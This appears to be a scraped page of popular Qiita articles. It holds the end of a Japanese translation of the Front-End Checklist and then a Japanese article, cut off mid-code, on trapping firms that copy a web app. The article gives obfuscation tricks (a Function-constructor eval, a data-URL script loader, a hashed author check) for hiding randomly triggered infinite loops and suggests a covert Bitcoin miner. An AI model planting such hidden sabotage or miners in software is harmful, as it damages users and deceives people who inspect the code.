<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Sitemap HTML:</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> HTML サイトマップが提供されており、フッターのリンクからリンクされている。</li>
</ul>

<blockquote>
<ul>
<li>📖 <a href="https://support.google.com/webmasters/answer/183668?hl=en" rel="nofollow noopener" target="_blank">Sitemap guidelines - Google Support</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Pagination link tags:</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> Provide <code>rel="prev"</code> and <code>rel="next"</code> to indicate paginated content.</li>
</ul>

<blockquote>
<ul>
<li><p>🛠 <a href="https://technicalseo.com/seo-tools/rel-prev-next/" rel="nofollow noopener" target="_blank">Pagination (rel="prev/next") Testing Tool</a></p></li>
<li><p>📖 <a href="https://support.google.com/webmasters/answer/1663744?hl=en" rel="nofollow noopener" target="_blank">Pagination guidelines - Google Support</a></p></li>
</ul>
</blockquote>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span>
<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">"prev"</span> <span class="na">href</span><span class="o">=</span><span class="s">"https://example.com/?page=1"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">"next"</span> <span class="na">href</span><span class="o">=</span><span class="s">"https://example.com/?page=3"</span><span class="p">&gt;</span>
</pre></div></div>

<p><strong><a href="#%E7%9B%AE%E6%AC%A1">⬆ トップに戻る</a></strong></p>

<hr>

<h2>
<span id="翻訳" class="fragment"></span><a href="#%E7%BF%BB%E8%A8%B3"><i class="fa fa-link"></i></a>翻訳</h2>

<p>フロントエンドチェックリストは、他の言語でも提供されています。すべての翻訳者の皆さん、すばらしい仕事をしてくれてありがとう！</p>

<ul>
<li>🇯🇵 Japanese: <a href="https://github.com/miya0001/Front-End-Checklist" rel="nofollow noopener" target="_blank">miya0001/Front-End-Checklist</a>
</li>
<li>🇪🇸 Spanish: <a href="https://github.com/eoasakura/Front-End-Checklist-ES" rel="nofollow noopener" target="_blank">eoasakura/Front-End-Checklist-ES</a>
</li>
<li>🇨🇳 Chinese: <a href="https://github.com/JohnsenZhou/Front-End-Checklist" rel="nofollow noopener" target="_blank">JohnsenZhou/Front-End-Checklist</a>
</li>
<li>🇰🇷 Korean: <a href="https://github.com/kesuskim/Front-End-Checklist" rel="nofollow noopener" target="_blank">kesuskim/Front-End-Checklist</a>
</li>
<li>🇧🇷 Portuguese: <a href="https://github.com/jcezarms/Front-End-Checklist" rel="nofollow noopener" target="_blank">jcezarms/Front-End-Checklist</a>
</li>
<li>🇻🇳 Vietnamese: <a href="https://github.com/euclid1990/Front-End-Checklist" rel="nofollow noopener" target="_blank">euclid1990/Front-End-Checklist</a>
</li>
<li>🇹🇼 Traditional Chinese: <a href="https://github.com/EngineLin/Front-End-Checklist" rel="nofollow noopener" target="_blank">EngineLin/Front-End-Checklist</a>
</li>
<li>🇫🇷 French: <a href="https://github.com/ynizon/Front-End-Checklist" rel="nofollow noopener" target="_blank">ynizon/Front-End-Checklist</a>
</li>
<li>🇷🇺 Russian: <a href="https://github.com/ungear/Front-End-Checklist" rel="nofollow noopener" target="_blank">ungear/Front-End-Checklist</a>
</li>
<li>🇹🇷 Turkish: <a href="https://github.com/erdoganoksuz/Front-End-Checklist" rel="nofollow noopener" target="_blank">erdoganoksuz/Front-End-Checklist</a>, <a href="https://github.com/eraycetinay/Front-End-Checklist" rel="nofollow noopener" target="_blank">eraycetinay/Front-End-Checklist</a>
</li>
</ul>

<hr>

<h2>
<span id="フロントエンドチェックリストバッジ" class="fragment"></span><a href="#%E3%83%95%E3%83%AD%E3%83%B3%E3%83%88%E3%82%A8%E3%83%B3%E3%83%89%E3%83%81%E3%82%A7%E3%83%83%E3%82%AF%E3%83%AA%E3%82%B9%E3%83%88%E3%83%90%E3%83%83%E3%82%B8"><i class="fa fa-link"></i></a>フロントエンドチェックリストバッジ</h2>

<p>もし、フロントエンドチェックリストのルールに従っていることをアピールしたいなら、README ファイルにこのバッジを貼ってください。</p>

<p>➔ <a href="https://github.com/thedaviddias/Front-End-Checklist/" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/8a3f975efc47ae3df93bcec7455b42b43e74a3dc/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f46726f6e74254532253830253931456e645f436865636b6c6973742d666f6c6c6f7765642d627269676874677265656e2e737667" alt="Front‑End_Checklist followed" data-canonical-src="https://img.shields.io/badge/Front%E2%80%91End_Checklist-followed-brightgreen.svg"></a></p>

<div class="code-frame" data-lang="md"><div class="highlight"><pre><span></span>[<span class="nt">![Front‑End_Checklist followed</span>](<span class="na">https://img.shields.io/badge/Front‑End_Checklist-followed-brightgreen.svg</span>)](https://github.com/thedaviddias/Front-End-Checklist/)
</pre></div></div>

<p><strong><a href="#%E7%9B%AE%E6%AC%A1">⬆ トップに戻る</a></strong></p>

<hr>

<h2>
<span id="貢献" class="fragment"></span><a href="#%E8%B2%A2%E7%8C%AE"><i class="fa fa-link"></i></a>貢献</h2>

<p>訳注： オリジナル版への貢献と区別するため、オリジナルへの貢献については英語の原文そのままを掲載しておきます。</p>

<p><strong>Open an issue or a pull request to suggest changes or additions.</strong></p>

<h3>
<span id="guide" class="fragment"></span><a href="#guide"><i class="fa fa-link"></i></a>Guide</h3>

<p>The <strong>Front-End Checklist</strong> repository consists of two branches:</p>

<h4>
<span id="1-master" class="fragment"></span><a href="#1-master"><i class="fa fa-link"></i></a>1. <code>master</code>
</h4>

<p>This branch consists of the <code>README.md</code> file that is automatically reflected on the <a href="http://frontendchecklist.com/" rel="nofollow noopener" target="_blank">Front-End Checklist</a> website.</p>

<h4>
<span id="2-develop" class="fragment"></span><a href="#2-develop"><i class="fa fa-link"></i></a>2. <code>develop</code>
</h4>

<p>This branch will be used to make some significant changes to the structure, content if needed. It is preferable to use the master branch to fix small errors or add a new item.</p>

<h2>
<span id="support" class="fragment"></span><a href="#support"><i class="fa fa-link"></i></a>Support</h2>

<p>If you have any question or suggestion, don't hesitate to use Gitter or Twitter:</p>

<ul>
<li><a href="https://gitter.im/Front-End-Checklist/Lobby?utm_source=share-link&amp;utm_medium=link&amp;utm_campaign=share-link" rel="nofollow noopener" target="_blank">Chat on Gitter</a></li>
<li><a href="https://www.facebook.com/frontendchecklist/" rel="nofollow noopener" target="_blank">Facebook</a></li>
<li><a href="https://twitter.com/thedaviddias" rel="nofollow noopener" target="_blank">Twitter</a></li>
</ul>

<h2>
<span id="authors" class="fragment"></span><a href="#authors"><i class="fa fa-link"></i></a>Authors</h2>

<p><strong><a href="https://github.com/thedaviddias/Front-End-Checklist" rel="nofollow noopener" target="_blank">David Dias</a></strong></p>

<h2>
<span id="contributors" class="fragment"></span><a href="#contributors"><i class="fa fa-link"></i></a>Contributors</h2>

<p>This project exists thanks to all the people who contribute. <a href="CONTRIBUTING.md">[Contribute]</a>.<br>
<a href="https://github.com/thedaviddias/Front-End-Checklist/graphs/contributors" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/0d2350ce417ae1082afe9d5fe7a2f0fa68c98562/68747470733a2f2f6f70656e636f6c6c6563746976652e636f6d2f66726f6e742d656e642d636865636b6c6973742f636f6e7472696275746f72732e7376673f77696474683d383930" data-canonical-src="https://opencollective.com/front-end-checklist/contributors.svg?width=890"></a></p>

<h2>
<span id="backers" class="fragment"></span><a href="#backers"><i class="fa fa-link"></i></a>Backers</h2>

<p>Thank you to all our backers! 🙏 [<a href="https://opencollective.com/front-end-checklist#backer" rel="nofollow noopener" target="_blank">Become a backer</a>]</p>

<p><a href="https://opencollective.com/front-end-checklist#backers" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/5a0c98169047e48e2b902c6171e92d85479be3c4/68747470733a2f2f6f70656e636f6c6c6563746976652e636f6d2f66726f6e742d656e642d636865636b6c6973742f6261636b6572732e7376673f77696474683d383930" data-canonical-src="https://opencollective.com/front-end-checklist/backers.svg?width=890"></a></p>

<h2>
<span id="sponsors" class="fragment"></span><a href="#sponsors"><i class="fa fa-link"></i></a>Sponsors</h2>

<p>Support this project by becoming a sponsor. Your logo will show up here with a link to your website. [<a href="https://opencollective.com/front-end-checklist#sponsor" rel="nofollow noopener" target="_blank">Become a sponsor</a>]</p>

<p><a href="https://opencollective.com/front-end-checklist/sponsor/0/website" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/ef3f4f5ab1f7473a767a198dbf5c9417b786d810/68747470733a2f2f6f70656e636f6c6c6563746976652e636f6d2f66726f6e742d656e642d636865636b6c6973742f73706f6e736f722f302f6176617461722e737667" data-canonical-src="https://opencollective.com/front-end-checklist/sponsor/0/avatar.svg"></a><br>
<a href="https://opencollective.com/front-end-checklist/sponsor/1/website" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/3610940f5a2b56533dee480e57d941e039471378/68747470733a2f2f6f70656e636f6c6c6563746976652e636f6d2f66726f6e742d656e642d636865636b6c6973742f73706f6e736f722f312f6176617461722e737667" data-canonical-src="https://opencollective.com/front-end-checklist/sponsor/1/avatar.svg"></a><br>
<a href="https://opencollective.com/front-end-checklist/sponsor/2/website" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/a6a279a47273e959ab55f2d6fb4ebf850c363ca6/68747470733a2f2f6f70656e636f6c6c6563746976652e636f6d2f66726f6e742d656e642d636865636b6c6973742f73706f6e736f722f322f6176617461722e737667" data-canonical-src="https://opencollective.com/front-end-checklist/sponsor/2/avatar.svg"></a><br>
<a href="https://opencollective.com/front-end-checklist/sponsor/3/website" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/e037ff8d5134291efc039b9b221526b9fce8c7d1/68747470733a2f2f6f70656e636f6c6c6563746976652e636f6d2f66726f6e742d656e642d636865636b6c6973742f73706f6e736f722f332f6176617461722e737667" data-canonical-src="https://opencollective.com/front-end-checklist/sponsor/3/avatar.svg"></a><br>
<a href="https://opencollective.com/front-end-checklist/sponsor/4/website" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/ca684e6bfc8a0d21ccedb2b4e0ce7d4fbbfa4d02/68747470733a2f2f6f70656e636f6c6c6563746976652e636f6d2f66726f6e742d656e642d636865636b6c6973742f73706f6e736f722f342f6176617461722e737667" data-canonical-src="https://opencollective.com/front-end-checklist/sponsor/4/avatar.svg"></a><br>
<a href="https://opencollective.com/front-end-checklist/sponsor/5/website" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/95edf4122eaf44c80d8eecb0d11dceaf16a0e4c9/68747470733a2f2f6f70656e636f6c6c6563746976652e636f6d2f66726f6e742d656e642d636865636b6c6973742f73706f6e736f722f352f6176617461722e737667" data-canonical-src="https://opencollective.com/front-end-checklist/sponsor/5/avatar.svg"></a><br>
<a href="https://opencollective.com/front-end-checklist/sponsor/6/website" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/fa754f68a6907615aae9f2ba016b17655a04abc1/68747470733a2f2f6f70656e636f6c6c6563746976652e636f6d2f66726f6e742d656e642d636865636b6c6973742f73706f6e736f722f362f6176617461722e737667" data-canonical-src="https://opencollective.com/front-end-checklist/sponsor/6/avatar.svg"></a><br>
<a href="https://opencollective.com/front-end-checklist/sponsor/7/website" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/483f43850c7dadb6498d5cdefb4946355215c3c4/68747470733a2f2f6f70656e636f6c6c6563746976652e636f6d2f66726f6e742d656e642d636865636b6c6973742f73706f6e736f722f372f6176617461722e737667" data-canonical-src="https://opencollective.com/front-end-checklist/sponsor/7/avatar.svg"></a><br>
<a href="https://opencollective.com/front-end-checklist/sponsor/8/website" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/f603b3ffaa4c282341549e264bc04dbe5b08ba10/68747470733a2f2f6f70656e636f6c6c6563746976652e636f6d2f66726f6e742d656e642d636865636b6c6973742f73706f6e736f722f382f6176617461722e737667" data-canonical-src="https://opencollective.com/front-end-checklist/sponsor/8/avatar.svg"></a><br>
<a href="https://opencollective.com/front-end-checklist/sponsor/9/website" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/b573e8a899d49f44d7535bb453a2cc51d0c30e37/68747470733a2f2f6f70656e636f6c6c6563746976652e636f6d2f66726f6e742d656e642d636865636b6c6973742f73706f6e736f722f392f6176617461722e737667" data-canonical-src="https://opencollective.com/front-end-checklist/sponsor/9/avatar.svg"></a></p>

<h2>
<span id="license" class="fragment"></span><a href="#license"><i class="fa fa-link"></i></a>License</h2>

<p><a href="https://creativecommons.org/publicdomain/zero/1.0/" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/0c0b0e11bfb694da2cf96cb29bbf617ec6c00a18/68747470733a2f2f692e6372656174697665636f6d6d6f6e732e6f72672f702f7a65726f2f312e302f38387833312e706e67" alt="CC0" data-canonical-src="https://i.creativecommons.org/p/zero/1.0/88x31.png"></a></p>

<p><strong><a href="#%E7%9B%AE%E6%AC%A1">⬆ トップに戻る</a></strong></p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">2位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>954</kbd>
		<a target="_blank" href="https://qiita.com/kacchan6@github/items/d8576ab6b3c16cf670ca">ウェブアプリをソースごとパクる業者に対する対策</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-11-11<br />11:06:01</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/3057.html">kacchan6@github</a>(32件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/3057/profile-images/1473682524">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[JavaScript]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>こんにちは。みなさんもウェブアプリをリリースしたあとに同業者にソースごとパクられたことってありますよね。難読化しても難読化されたまま同業者のサーバで動くので困ったものです。そこで、私がとった解析しずらい対策をまとめてみたいと思います。</p>

<h1>
<span id="前提" class="fragment"></span><a href="#%E5%89%8D%E6%8F%90"><i class="fa fa-link"></i></a>前提</h1>

<p>多機能な画面をJavaScriptでゴリゴリ作ったのにもかかわらず、HTMLやCSS、JavaScriptファイル一式を自社サーバにまるごとコピーして、ライセンス表記だけ書き換えて使うような業者を罠にはめるということを想定しています。</p>

<p>当然通信をリバースエンジニアリングする人もいるので、自社サーバでは防げないという前提です。</p>

<h1>
<span id="htmlにはauthorメタタグ" class="fragment"></span><a href="#html%E3%81%AB%E3%81%AFauthor%E3%83%A1%E3%82%BF%E3%82%BF%E3%82%B0"><i class="fa fa-link"></i></a>HTMLにはauthorメタタグ</h1>

<p>よくあるMETAタグで権利者を明記します。これは権利の主張もそうですが、JavaScript自体に権利者が認定した権利者でなければ無限ループを起こすという処理のためにも使用します。逆に、権利者が我々にあるという状態でパクってもらう分にはよしと割り切ります。</p>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">"author"</span> <span class="na">content</span><span class="o">=</span><span class="s">"OreOre"</span><span class="p">&gt;</span>
</pre></div></div>

<h1>
<span id="ランダムで無限ループを起こす" class="fragment"></span><a href="#%E3%83%A9%E3%83%B3%E3%83%80%E3%83%A0%E3%81%A7%E7%84%A1%E9%99%90%E3%83%AB%E3%83%BC%E3%83%97%E3%82%92%E8%B5%B7%E3%81%93%E3%81%99"><i class="fa fa-link"></i></a>ランダムで無限ループを起こす</h1>

<p>毎回決まったタイミングで発生したらプログラマはデバッグして対策しやすいです。なので、数％の確率で、数秒〜数百秒後にランダムで発生させるようにすると「あれ？うまく動いているじゃん」「あれ？動かなくなった」となります。プログラマが一番イヤな再現性がバラバラで低いというのを実現します。</p>

<h1>
<span id="無限ループするコードを非同期で読み込む" class="fragment"></span><a href="#%E7%84%A1%E9%99%90%E3%83%AB%E3%83%BC%E3%83%97%E3%81%99%E3%82%8B%E3%82%B3%E3%83%BC%E3%83%89%E3%82%92%E9%9D%9E%E5%90%8C%E6%9C%9F%E3%81%A7%E8%AA%AD%E3%81%BF%E8%BE%BC%E3%82%80"><i class="fa fa-link"></i></a>無限ループするコードを非同期で読み込む</h1>

<p>以下の例は<code>console.log(1)</code>を実行していますが<code>while(1);</code>にすると返ってこなくなります。</p>

<div class="code-frame" data-lang="JavaScript"><div class="highlight"><pre><span></span><span class="kd">var</span> <span class="nx">script</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">"script"</span><span class="p">);</span>
<span class="nx">script</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s2">"data:text/javascript;base64,Y29uc29sZS5sb2coMSk="</span><span class="p">;</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">head</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">script</span><span class="p">);</span>
</pre></div></div>

<p>開発ツールでもブレークポイントを設定しにくいのがポイントです。</p>

<h1>
<span id="独自の難読化を行う" class="fragment"></span><a href="#%E7%8B%AC%E8%87%AA%E3%81%AE%E9%9B%A3%E8%AA%AD%E5%8C%96%E3%82%92%E8%A1%8C%E3%81%86"><i class="fa fa-link"></i></a>独自の難読化を行う</h1>

<p>無限ループを発生させるコードに独自の難読化を仕掛けます。要は何をやっているんか分かりにくくするためです。<code>eval(src)</code>と書いてしまうと「あ、ここで実行しているな」と一目瞭然だったりします。</p>

<div class="code-frame" data-lang="JavaScript"><div class="highlight"><pre><span></span><span class="nx">s</span> <span class="o">=</span> <span class="p">...</span><span class="nx">長い処理でスクリプト生成</span><span class="p">(</span><span class="nx">この処理自体も適度に難読化</span><span class="p">)</span>
<span class="nx">a</span><span class="o">=</span><span class="p">[</span><span class="nx">a</span><span class="o">=</span><span class="mi">338403347140888</span><span class="p">..</span><span class="nx">toString</span><span class="p">(</span><span class="mi">31</span><span class="p">)][</span><span class="nx">a</span><span class="o">=</span><span class="nx">a</span><span class="o">+</span><span class="nx">a</span><span class="p">[</span><span class="mi">5</span><span class="p">]][</span><span class="nx">a</span><span class="p">](</span><span class="nx">s</span><span class="p">)();</span>
</pre></div></div>

<p>わかりやすく書くと、こうなります。</p>

<div class="code-frame" data-lang="JavaScript"><div class="highlight"><pre><span></span><span class="c1">//aに"constructo"を代入</span>
<span class="c1">//constructoという文字を31進数から10進数に変換すると338403347140888になる</span>
<span class="c1">//最後のrは精度不足で作れないので諦める</span>
<span class="nx">a</span><span class="o">=</span><span class="mi">338403347140888</span><span class="p">..</span><span class="nx">toString</span><span class="p">(</span><span class="mi">31</span><span class="p">);</span>
<span class="c1">//aに"constructo" + "r"を代入</span>
<span class="c1">//諦めた最後のrを6文字目から取り出して結合</span>
<span class="nx">a</span> <span class="o">=</span> <span class="nx">a</span> <span class="o">+</span> <span class="nx">a</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
<span class="c1">//Functionを取り出して(String.prototype.constructor.constructor)、文字列を実行</span>
<span class="c1">//Function(s)と同じ</span>
<span class="nx">a</span><span class="p">[</span><span class="s2">"constructor"</span><span class="p">][</span><span class="s2">"constructor"</span><span class="p">](</span><span class="nx">s</span><span class="p">);</span>
</pre></div></div>

<p>ちなみにツールでの難読化はやめましょう。デコーダが大抵あります。</p>

<h1>
<span id="無限ループのトリガーを工夫する" class="fragment"></span><a href="#%E7%84%A1%E9%99%90%E3%83%AB%E3%83%BC%E3%83%97%E3%81%AE%E3%83%88%E3%83%AA%E3%82%AC%E3%83%BC%E3%82%92%E5%B7%A5%E5%A4%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>無限ループのトリガーを工夫する</h1>

<p>上記例では無限ループするスクリプトを動的にDataURLでロードしていますが、<code>z=1</code>というコードにしつつ、全く別の所でwindow.zの値を監視して1になったら無限ループするというのもかなり追いにくくなるしょう。</p>

<h1>
<span id="ソース上に分散させる" class="fragment"></span><a href="#%E3%82%BD%E3%83%BC%E3%82%B9%E4%B8%8A%E3%81%AB%E5%88%86%E6%95%A3%E3%81%95%E3%81%9B%E3%82%8B"><i class="fa fa-link"></i></a>ソース上に分散させる</h1>

<p>1箇所に無限ループを発生させるコードをまとめてしまうと追いやすくなります。Webpackなどでビルドする際に、無限ループ発生に関わるコードの関数をバラバラな位置に登場するようにするとより追いにくくなります。</p>

<p>例えばscriptタグの生成と、srcの設定と、documentへ追加、それぞれを別々のモジュールにしつつ全然関係ない処理で最初に参照されるようにします。</p>

<p>特にWebpackとuglifyでビルドすると、何気ない処理が実は無限ループに関わっている、ということがより一層分かりにくくなります。</p>

<h1>
<span id="その他工夫など" class="fragment"></span><a href="#%E3%81%9D%E3%81%AE%E4%BB%96%E5%B7%A5%E5%A4%AB%E3%81%AA%E3%81%A9"><i class="fa fa-link"></i></a>その他工夫など</h1>

<ul>
<li>システム上重要そうに見えるフラグと無限ループのフラグを共有する</li>
<li>metaタグのauthorではなく、location.hrefなどで判定する</li>
<li>無限ループではなくビットコインの発掘コードを発動させる</li>
<li>メインではなくWebWorkerで無限ループさせる</li>
<li>WebAssemblyで無限ループさせる</li>
</ul>

<h1>
<span id="追記" class="fragment"></span><a href="#%E8%BF%BD%E8%A8%98"><i class="fa fa-link"></i></a>追記</h1>

<p>はてブで面白いアイデアを頂いたので追記しますが、土日限定でトラブルを起こすようにするのもいいですね。サービスによっては土日はよく売り上げがあがるにも関わらず、エンジニアは休みを取っているということが多々あります。問い合わせが土日にきて、月曜日にエンジニアが調査したら再現しない。という感じになります。</p>

<p>更に追記</p>

<p>authorを取得して比較するだけであれば、以下のようなコードでいけますが、はっきり言ってバレバレです。</p>

<div class="code-frame" data-lang="JavaScript"><div class="highlight"><pre><span></span><span class="kd">var</span> <span class="nx">author</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s2">"meta[name=author]"</span><span class="p">).</span><span class="nx">getAttribute</span><span class="p">(</span><span class="s2">"content"</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="nx">author</span> <span class="o">==</span> <span class="s2">"OreOre Inc."</span><span class="p">){</span>
<span class="c1">//ここで発動準備</span>
<span class="p">}</span>
</pre></div></div>

<p>短く簡易的な独自なアルゴリズムでハッシュ化したauthorと固定の数字を比較したほうがバレにくいでしょう。</p>

<div class="code-frame" data-lang="JavaScript"><div class="highlight"><pre><span></span><span class="kd">function</span> <span class="nx">test</span><span class="p">(</span><span class="nx">c</span><span class="p">,</span> <span class="nx">h</span><span class="p">){</span>
    <span class="nx">c</span> <span class="o">+=</span> <span class="s2">" "</span><span class="p">.</span><span class="nx">repeat</span><span class="p">(</span><span class="mi">4</span> <span class="o">-</span> <span class="nx">c</span><span class="p">.</span><span class="nx">length</span> <span class="o">%</span> <span class="mi">4</span><span class="p">)</span>

    <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">l</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">length</span><span class="p">,</span> <span class="nx">v</span> <span class="o">=</span> <span class="mh">0x12345678</span><span class="p">,</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">.</span><span class="nx">bind</span><span class="p">(</span><span class="nx">c</span><span class="p">);</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">l</span><span class="p">;</span> <span class="nx">i</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">){</span>
        <span class="c1">//入力された文字でソルト0x12345678のxorを8bitごとに求める</span>
        <span class="nx">v</span> <span class="o">^=</span> <span class="p">(</span><span class="nx">a</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">;</span>
        <span class="nx">v</span> <span class="o">^=</span> <span class="p">(</span><span class="nx">a</span><span class="p">(</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">;</span>
        <span class="nx">v</span> <span class="o">^=</span> <span class="p">(</span><span class="nx">a</span><span class="p">(</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">;</span>
        <span class="nx">v</span> <span class="o">^=</span> <span class="p">(</span><span class="nx">a</span><span class="p">(</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>

        <span class="c1">//xorshift32と同じ計算でランダムな数字にする</span>
        <span class="nx">v</span> <span class="o">^=</span> <span class="nx">v</span> <span class="o">&lt;&lt;</span> <span class="mi">13</span><span class="p">;</span>   
        <span class="nx">v</span> <span class="o">^=</span> <span class="nx">v</span> <span class="o">&gt;&gt;</span> <span class="mi">17</span><span class="p">;</span>   
        <span class="nx">v</span> <span class="o">^=</span> <span class="nx">v</span> <span class="o">&lt;&lt;</span> <span class="mi">15</span><span class="p">;</span>   
    <span class="p">}</span>

    <span class="k">return</span> <span class="nx">v</span> <span class="o">==</span> <span class="nx">h</span><span class="p">;</span>
<span class="p">}</span>

<span class="nx">test</span><span class="p">(</span><span class="nx">author</span><span class="cm">/*"Ore Ore Inc."*/</span><span class="p">,</span> <span class="o">-</span><span class="mi">658575506</span><span class="p">);</span>
</pre></div></div>

<p>このtest関数をuglifyすると以下のようになります。</p>

<div class="code-frame" data-lang="JavaScript"><div class="highlight"><pre><span></span><span class="kd">function</span> <span class="nx">test</span><span class="p">(</span><span class="nx">t</span><span class="p">,</span><span class="nx">e</span><span class="p">){</span><span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">r</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">n</span><span class="o">=</span><span class="p">(</span><span class="nx">t</span><span class="o">+=</span><span class="s2">" "</span><span class="p">.</span><span class="nx">repeat</span><span class="p">(</span><span class="mi">4</span><span class="o">-</span><span class="nx">t</span><span class="p">.</span><span class="nx">length</span><span class="o">%</span><span class="mi">4</span><span class="p">)).</span><span class="nx">length</span><span class="p">,</span><span class="nx">a</span><span class="o">=</span><span class="mi">305419896</span><span class="p">,</span><span class="nx">h</span><span class="o">=</span><span class="nx">t</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">.</span><span class="nx">bind</span><span class="p">(</span><span class="nx">t</span><span class="p">);</span><span class="nx">r</span><span class="o">&lt;</span><span class="nx">n</span><span class="p">;</span><span class="nx">r</span><span class="o">+=</span><span class="mi">4</span><span class="p">)</span><span class="nx">a</span><span class="o">^=</span><span class="p">(</span><span class="mi">255</span><span class="o">&amp;</span><span class="nx">h</span><span class="p">(</span><span class="nx">r</span><span class="p">))</span><span class="o">&lt;&lt;</span><span class="mi">24</span><span class="p">,</span><span class="nx">a</span><span class="o">^=</span><span class="p">(</span><span class="mi">255</span><span class="o">&amp;</span><span class="nx">h</span><span class="p">(</span><span class="nx">r</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span><span class="o">&lt;&lt;</span><span class="mi">16</span><span class="p">,</span><span class="nx">a</span><span class="o">^=</span><span class="p">(</span><span class="mi">255</span><span class="o">&amp;</span><span class="nx">h</span><span class="p">(</span><span class="nx">r</span><span class="o">+</span><span class="mi">2</span><span class="p">))</span><span class="o">&lt;&lt;</span><span class="mi">8</span><span class="p">,</span><span class="nx">a</span><span class="o">^=</span><span class="mi">255</span><span class="o">&amp;</span><span class="nx">h</span><span class="p">(</span><span class="nx">r</span><span class="o">+</span><span class="mi">3</span><span class="p">),</span><span class="nx">a</span><span class="o">^=</span><span class="nx">a</span><span class="o">&lt;&lt;</span><span class="mi">13</span><span class="p">,</span><span class="nx">a</span><span class="o">^=</span><span class="nx">a</span><span class="o">&gt;&gt;</span><span class="mi">17</span><span class="p">,</span><span class="nx">a</span><span class="o">^=</span><span class="nx">a</span><span 